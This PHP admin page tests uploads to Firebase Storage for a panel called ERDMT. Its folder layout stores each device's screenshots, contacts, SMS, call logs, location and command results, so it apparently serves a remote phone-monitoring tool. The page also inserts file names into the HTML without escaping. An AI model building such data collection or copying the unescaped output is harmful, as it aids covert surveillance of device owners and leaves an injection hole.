<?php
/**
 * Firebase Storage Test for ERDMT
 * Test file upload and download functionality
 */

session_start();
require_once 'config/database.php';
require_once 'config/firebase_config.php';

// Check if user is logged in
if (!isset($_SESSION['admin_logged_in'])) {
    header('Location: login.php');
    exit();
}

$pageTitle = "Storage Test";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $pageTitle; ?> - ERDMT Admin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/admin.css" rel="stylesheet">
</head>
<body>
    <?php include 'includes/header.php'; ?>

    <div class="container-fluid">
        <div class="row">
            <?php include 'includes/sidebar.php'; ?>

            <main class="col-md-9 ms-sm-auto col-lg-10 px-md-4">
                <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                    <h1 class="h2">Firebase Storage Test</h1>
                </div>

                <!-- Storage Test Interface -->
                <div class="row">
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">
                                <h5>Test File Upload</h5>
                            </div>
                            <div class="card-body">
                                <form id="uploadTestForm">
                                    <div class="mb-3">
                                        <label for="testFile" class="form-label">Select Test File</label>
                                        <input type="file" class="form-control" id="testFile" accept=".jpg,.png,.json,.txt,.csv">
                                    </div>
                                    <div class="mb-3">
                                        <label for="deviceId" class="form-label">Device ID</label>
                                        <input type="text" class="form-control" id="deviceId" value="test_device" required>
                                    </div>
                                    <div class="mb-3">
                                        <label for="storageType" class="form-label">Storage Type</label>
                                        <select class="form-control" id="storageType">
                                            <option value="screenshots">Screenshots</option>
                                            <option value="device_data">Device Data</option>
                                            <option value="contacts">Contacts</option>
                                            <option value="sms">SMS</option>
                                            <option value="call_logs">Call Logs</option>
                                            <option value="app_lists">App Lists</option>
                                            <option value="location">Location</option>
                                            <option value="system_info">System Info</option>
                                            <option value="temp">Temp Files</option>
                                        </select>
                                    </div>
                                    <button type="submit" class="btn btn-primary">Upload Test File</button>
                                </form>
                                <div id="uploadProgress" class="mt-3" style="display: none;">
                                    <div class="progress">
                                        <div class="progress-bar" role="progressbar" style="width: 0%"></div>
                                    </div>
                                </div>
                                <div id="uploadResult" class="mt-3"></div>
                            </div>
                        </div>
                    </div>

                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">
                                <h5>Storage Structure Test</h5>
                            </div>
                            <div class="card-body">
                                <h6>Expected Folder Structure:</h6>
                                <ul class="list-unstyled">
                                    <li>📁 screenshots/device_id/</li>
                                    <li>📁 device_data/device_id/</li>
                                    <li>📁 contacts/device_id/</li>
                                    <li>📁 sms/device_id/</li>
                                    <li>📁 call_logs/device_id/</li>
                                    <li>📁 app_lists/device_id/</li>
                                    <li>📁 location/device_id/</li>
                                    <li>📁 system_info/device_id/</li>
                                    <li>📁 admin_uploads/device_id/</li>
                                    <li>📁 command_results/device_id/</li>
                                    <li>📁 logs/device_id/</li>
                                    <li>📁 archive/device_id/</li>
                                    <li>📁 temp/device_id/</li>
                                </ul>

                                <h6 class="mt-4">File Size Limits:</h6>
                                <ul class="list-unstyled">
                                    <li>Screenshots: 10MB</li>
                                    <li>Data Files: 5MB</li>
                                    <li>Admin Uploads: 50MB</li>
                                    <li>Archive Files: 100MB</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Storage Rules Display -->
                <div class="row mt-4">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-header">
                                <h5>Firebase Storage Rules</h5>
                            </div>
                            <div class="card-body">
                                <pre id="storageRules" class="bg-light p-3" style="font-size: 0.9em; overflow-x: auto;">
// Loading storage rules...
                                </pre>
                                <button class="btn btn-success" onclick="copyRules()">Copy Rules to Clipboard</button>
                                <a href="https://console.firebase.google.com/project/remoteadmin-a1089/storage/rules" target="_blank" class="btn btn-primary">Open Firebase Console</a>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    
    <script>
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "<?php echo FIREBASE_API_KEY; ?>",
            authDomain: "<?php echo FIREBASE_PROJECT_ID; ?>.firebaseapp.com",
            databaseURL: "<?php echo FIREBASE_DATABASE_URL; ?>",
            projectId: "<?php echo FIREBASE_PROJECT_ID; ?>",
            storageBucket: "<?php echo FIREBASE_STORAGE_BUCKET; ?>",
            messagingSenderId: "<?php echo FIREBASE_MESSAGING_SENDER_ID; ?>",
            appId: "<?php echo FIREBASE_APP_ID; ?>"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const storage = firebase.storage();

        // Load storage rules
        fetch('config/firebase-storage-rules.txt')
            .then(response => response.text())
            .then(rules => {
                document.getElementById('storageRules').textContent = rules;
            })
            .catch(error => {
                document.getElementById('storageRules').textContent = 'Error loading storage rules: ' + error;
            });

        // File upload test
        document.getElementById('uploadTestForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const fileInput = document.getElementById('testFile');
            const deviceId = document.getElementById('deviceId').value;
            const storageType = document.getElementById('storageType').value;
            const file = fileInput.files[0];
            
            if (!file) {
                alert('Please select a file');
                return;
            }
            
            // Create storage path
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const fileName = `${timestamp}-${file.name}`;
            const storagePath = `${storageType}/${deviceId}/${fileName}`;
            
            // Show progress
            document.getElementById('uploadProgress').style.display = 'block';
            const progressBar = document.querySelector('.progress-bar');
            
            // Upload file
            const storageRef = storage.ref(storagePath);
            const uploadTask = storageRef.put(file);
            
            uploadTask.on('state_changed',
                (snapshot) => {
                    // Progress
                    const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                    progressBar.style.width = progress + '%';
                    progressBar.textContent = Math.round(progress) + '%';
                },
                (error) => {
                    // Error
                    document.getElementById('uploadResult').innerHTML = 
                        `<div class="alert alert-danger">Upload failed: ${error.message}</div>`;
                },
                () => {
                    // Success
                    uploadTask.snapshot.ref.getDownloadURL().then((downloadURL) => {
                        document.getElementById('uploadResult').innerHTML = 
                            `<div class="alert alert-success">
                                <strong>Upload successful!</strong><br>
                                <strong>Path:</strong> ${storagePath}<br>
                                <strong>URL:</strong> <a href="${downloadURL}" target="_blank">View File</a>
                            </div>`;
                        document.getElementById('uploadProgress').style.display = 'none';
                    });
                }
            );
        });

        function copyRules() {
            const rules = document.getElementById('storageRules').textContent;
            navigator.clipboard.writeText(rules).then(() => {
                alert('Storage rules copied to clipboard!');
            });
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="assets/js/admin.js"></script>
</body>
</html>